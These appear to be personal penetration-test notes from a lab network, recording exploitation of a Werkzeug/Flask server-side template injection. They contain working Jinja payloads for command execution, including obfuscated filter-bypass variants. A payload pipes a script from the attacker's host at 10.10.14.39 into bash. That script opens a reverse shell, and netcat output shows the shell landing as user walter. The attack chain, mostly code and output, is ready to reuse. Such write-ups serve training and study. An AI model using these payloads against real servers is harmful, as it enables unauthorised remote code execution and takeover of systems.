Googled `werkzeug ssti 2.0.2` exploit and came across exploit notes
![[Pasted image 20240502091118.png]]
Navigating to the webpage shows `SSTI (Server-Side Teamplate Injection)` which shows things to try
![[Pasted image 20240502091040.png]]
trying the 1st one worked `{{ 4*2 }}`
![[Pasted image 20240502091756.png]]
2nd one worked `{{ config.items() }}`
```bash
No results for dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)]) 
```
![[Pasted image 20240502092039.png]]
# RCE Testing

`{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}` 
`{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}`
`{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
`{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}`
- New user `Walter`
![[Pasted image 20240502093515.png]]

# Initial Access Reverse Shell

reverse shell input 
```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.39:8000/revshell.sh | bash').read()}}
```
![[Pasted image 20240502101737.png]]

python3 server setup
```bash
┌──(kali㉿gobots)-[02May2024 13:49:23]-[~/SUT/10.10.110.60]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.110.60 - - [02/May/2024 13:50:42] "GET /revshell.sh HTTP/1.1" 200 -
```

revshell.sh
```bash
┌──(kali㉿gobots)-[02May2024 13:51:37]-[~/SUT/10.10.110.60]
└─$ cat revshell.sh 
bash -c "bash -i >& /dev/tcp/10.10.14.39/4444 0>&1"
```

```bash
Script started, output log file is '/home/kali/SUT/logs/termlogs/20240502_134901_shell.log'.
┌──(kali㉿gobots)-[02May2024 13:49:15]-[~]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.110.60] 47436
bash: cannot set terminal process group (1003): Inappropriate ioctl for device
bash: no job control in this shell
walter@APP01-Hades:~/app$ getuid
getuid
Command 'getuid' not found, did you mean:
  command 'setuid' from deb super (3.30.3-2)
Try: apt install <deb name>
walter@APP01-Hades:~/app$ 

```
![[Pasted image 20240502101424.png]]